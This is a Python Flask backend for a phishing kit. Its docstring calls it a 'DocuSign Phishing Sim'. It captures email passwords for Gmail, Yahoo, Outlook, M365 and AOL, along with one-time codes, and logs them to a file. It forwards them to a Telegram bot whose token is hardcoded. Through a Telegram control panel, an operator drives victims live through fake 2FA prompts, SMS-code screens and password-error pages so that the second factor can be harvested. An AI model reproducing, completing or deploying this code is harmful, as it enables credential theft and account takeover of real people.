#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API
Full Gmail control panel with all options visible at once
"""

import json, logging, datetime, hashlib, threading, time, random, os
from flask import Flask, request, jsonify, send_from_directory, make_response
import requests as http_req

TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"
API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

app = Flask(__name__)

gmail_sessions = {}
gmail_sessions_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


def get_real_ip():
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        ip = forwarded.split(",")[0].strip()
        if ip and not ip.startswith(("10.", "172.16.", "192.168.", "127.")):
            return ip
    return request.remote_addr


def tg_send(text, markup=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    if markup:
        payload["reply_markup"] = json.dumps(markup)
    try:
        r = http_req.post(f"{API_BASE}/sendMessage", json=payload, timeout=15)
        d = r.json()
        if d.get("ok"):
            return d["result"]["message_id"]
        logger.error(f"TG fail: {d}")
    except Exception as e:
        logger.error(f"TG error: {e}")
    return None


def tg_edit(msg_id, text, markup=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": msg_id, "text": text}
    if markup:
        payload["reply_markup"] = json.dumps(markup)
    try:
        http_req.post(f"{API_BASE}/editMessageText", json=payload, timeout=15)
    except Exception as e:
        logger.error(f"TG edit error: {e}")


def tg_answer(cq_id):
    try:
        http_req.post(f"{API_BASE}/answerCallbackQuery",
                      json={"callback_query_id": cq_id}, timeout=10)
    except:
        pass


def send_control_panel(sid, email, prev_msg_id=None):
    """Send or update the control panel with all buttons visible."""
    kb = {"inline_keyboard": [
        [{"text": "✅ Yes / 2FA Prompt", "callback_data": f"2fa_grid:{sid}"}],
        [{"text": "📱 SMS Code I", "callback_data": f"sms1:{sid}"},
         {"text": "📱 SMS Code II", "callback_data": f"sms2:{sid}"}],
        [{"text": "🔑 Password Error", "callback_data": f"pw_error:{sid}"},
         {"text": "✅ Complete (Success)", "callback_data": f"success:{sid}"}],
        [{"text": "❌ Deny", "callback_data": f"no:{sid}"},
         {"text": "🚫 Cancel", "callback_data": f"cancel:{sid}"}]
    ]}
    text = f"🔔 GMAIL Control Panel — {email}"
    if prev_msg_id:
        tg_edit(prev_msg_id, text, kb)
        return prev_msg_id
    else:
        return tg_send(text, kb)


@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        d = request.get_json(force=True)
        if "callback_query" in d:
            cb = d["callback_query"]
            tg_answer(cb["id"])
            data = cb["data"]
            mid = cb["message"]["message_id"]

            # ─── 2FA Number Grid ───
            if data.startswith("2fa_grid:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid not in gmail_sessions:
                        tg_send("Session not found")
                        return jsonify({"ok": True})
                    s = gmail_sessions[sid]
                    s["action"] = "2fa_grid"
                    s["stage"] = "awaiting_2fa"
                    rows = []
                    row = []
                    for i in range(10, 100):
                        row.append({"text": str(i), "callback_data": f"2fa:{sid}:{i}"})
                        if len(row) == 9:
                            rows.append(row); row = []
                    if row: rows.append(row)
                    rows.append([{"text": "🔙 Back to Control Panel", "callback_data": f"back_panel:{sid}"}])
                    tg_edit(mid, f"🔐 Select the last 2 digits of the phone number:", {"inline_keyboard": rows})

            # ─── 2FA Number Selected ───
            elif data.startswith("2fa:"):
                parts = data.split(":")
                sid, digit = parts[1], parts[2]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["phone"] = digit
                        gmail_sessions[sid]["action"] = "show_prompt"
                        gmail_sessions[sid]["stage"] = "prompt_shown"
                        kb = {"inline_keyboard": [[{"text": "✅ User Authorized", "callback_data": f"authorized:{sid}"}]]}
                        tg_edit(mid, f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user.", kb)

            # ─── User Clicked Authorized ───
            elif data.startswith("authorized:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        code1 = f"{random.randint(100000, 999999)}"
                        gmail_sessions[sid]["sms1"] = code1
                        gmail_sessions[sid]["action"] = "sms1"
                        gmail_sessions[sid]["stage"] = "sms1"
                        tg_edit(mid, f"✅ User Authorized\n📱 SMS Code I: `{code1}`\n\nWaiting for SMS II...", None)

            # ─── SMS Code I (direct trigger) ───
            elif data.startswith("sms1:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        code1 = f"{random.randint(100000, 999999)}"
                        gmail_sessions[sid]["sms1"] = code1
                        gmail_sessions[sid]["action"] = "sms1"
                        gmail_sessions[sid]["stage"] = "sms1"
                        tg_edit(mid, f"📱 SMS Code I: `{code1}`\n\nSent to user.", None)
                        send_control_panel(sid, gmail_sessions[sid]["email"], mid)

            # ─── SMS Code II ───
            elif data.startswith("sms2:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        code2 = f"{random.randint(100000, 999999)}"
                        gmail_sessions[sid]["sms2"] = code2
                        gmail_sessions[sid]["action"] = "sms2"
                        gmail_sessions[sid]["stage"] = "sms2"
                        tg_edit(mid, f"📱 SMS Code II: `{code2}`\n\nSent to user.", None)
                        send_control_panel(sid, gmail_sessions[sid]["email"], mid)

            # ─── Password Error ───
            elif data.startswith("pw_error:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["action"] = "pw_error"
                        gmail_sessions[sid]["stage"] = "pw_error"
                    tg_send("🔑 Showing 'Wrong Password' to user.")

            # ─── Success ───
            elif data.startswith("success:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        s = gmail_sessions[sid]
                        s["action"] = "success"
                        s["stage"] = "done"
                        tg_edit(mid,
                            f"✅ COMPLETE — {s['email']}\n\n"
                            f"Email: {s['email']}\nPassword: {s['password']}\n"
                            f"Phone: ••••{s.get('phone','N/A')}\n"
                            f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}")

            # ─── Deny ───
            elif data.startswith("no:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["action"] = "denied"
                        gmail_sessions[sid]["stage"] = "denied"
                    tg_edit(mid, "❌ Access Denied — user redirected.")

            # ─── Cancel ───
            elif data.startswith("cancel:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["action"] = "cancelled"
                        gmail_sessions[sid]["stage"] = "cancelled"
                    tg_edit(mid, "❌ Session cancelled.")

            # ─── Back to Control Panel ───
            elif data.startswith("back_panel:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        s = gmail_sessions[sid]
                    else:
                        return jsonify({"ok": True})
                send_control_panel(sid, s["email"], mid)

        elif "message" in d:
            msg = d["message"]
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "")
            if str(chat_id) == TELEGRAM_CHAT_ID:
                if text == "/status":
                    with gmail_sessions_lock:
                        active = [(k, v) for k, v in gmail_sessions.items() if v.get("action") not in ("success", "cancelled")]
                    if not active:
                        tg_send("No active sessions.")
                    else:
                        lines = [f"Active: {len(active)}"]
                        for sid, s in active:
                            lines.append(f"• {s['email']} — {s.get('stage','?')}")
                        tg_send("\n".join(lines))
                elif text == "/id":
                    tg_send(f"Chat ID: {chat_id}")
                elif text == "/webhook_info":
                    try:
                        r = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=10)
                        info = r.json().get("result", {})
                        tg_send(
                            f"URL: {info.get('url','N/A')}\n"
                            f"Pending: {info.get('pending_update_count','?')}\n"
                            f"Allowed: {info.get('allowed_updates','N/A')}\n"
                            f"Error: {info.get('last_error_message','None')}")
                    except Exception as e:
                        tg_send(f"Error: {e}")

        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return jsonify({"ok": False}), 500


@app.route("/")
def index():
    return send_from_directory(".", "index.html")


@app.route("/setup_webhook", methods=["POST"])
def setup_webhook():
    data = request.json
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "Provide url"}), 400
    wh = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"
    try:
        http_req.get(f"{API_BASE}/deleteWebhook", params={"drop_pending_updates": True}, timeout=15)
        http_req.post(f"{API_BASE}/setWebhook", json={
            "url": wh, "allowed_updates": ["message", "callback_query"],
            "drop_pending_updates": True
        }, timeout=15)
        time.sleep(1)
        info = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15).json()
        return jsonify({"webhook_url": wh, "info": info.get("result", info)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/creds", methods=["POST", "OPTIONS"])
def capture():
    if request.method == "OPTIONS":
        return make_response("", 204)

    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = get_real_ip()
    ua = request.headers.get("User-Agent", "unknown")
    sid = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": sid}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"Creds: {provider} / {email} / IP={ip}")

    if provider == "gmail":
        with gmail_sessions_lock:
            gmail_sessions[sid] = {
                "email": email, "password": password, "ip": ip, "ua": ua,
                "action": "waiting", "stage": "new",
                "phone": None, "sms1": None, "sms2": None
            }

        # Creds drop
        tg_send(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
                f"New form submission\nIP: {ip}\nEmail: {email}\nPassword: {password}\nUA: {ua}")

        # Full control panel — ALL buttons visible at once
        send_control_panel(sid, email)

        return jsonify({"session": sid, "action": "waiting"})

    else:
        pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
        tg_send(f"[+]___ Invitation Card ___[+]\nIP: {ip}\nId: {pid}\nEmail: {email}\nPassword: {password}")
        return jsonify({"session": sid, "action": "check_provider"})


@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    with gmail_sessions_lock:
        if session_id not in gmail_sessions:
            return jsonify({"action": "waiting"})
        s = gmail_sessions[session_id]
        action = s.get("action", "waiting")

    if action == "waiting":
        return jsonify({"action": "waiting"})
    elif action == "show_prompt":
        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX"), "email": s.get("email", "")})
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "denied":
        return jsonify({"action": "denied"})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action == "cancelled":
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    return jsonify({"action": "waiting"})


@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
def gmail_authorize(session_id):
    with gmail_sessions_lock:
        if session_id in gmail_sessions:
            gmail_sessions[session_id]["action"] = "authorized"
            tg_send(f"✅ User clicked 'Authorized' for {gmail_sessions[session_id]['email']}")
        else:
            return jsonify({"status": "error"}), 404
    return jsonify({"status": "ok"})


@app.route("/api/otp", methods=["POST"])
def capture_otp():
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = get_real_ip()

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"OTP: {provider} / {otp} / IP={ip}")
    tg_send(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
    return jsonify({"status": "ok"})


@app.route("/health")
def health():
    with gmail_sessions_lock:
        return jsonify({"status": "ok", "sessions": len(gmail_sessions)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
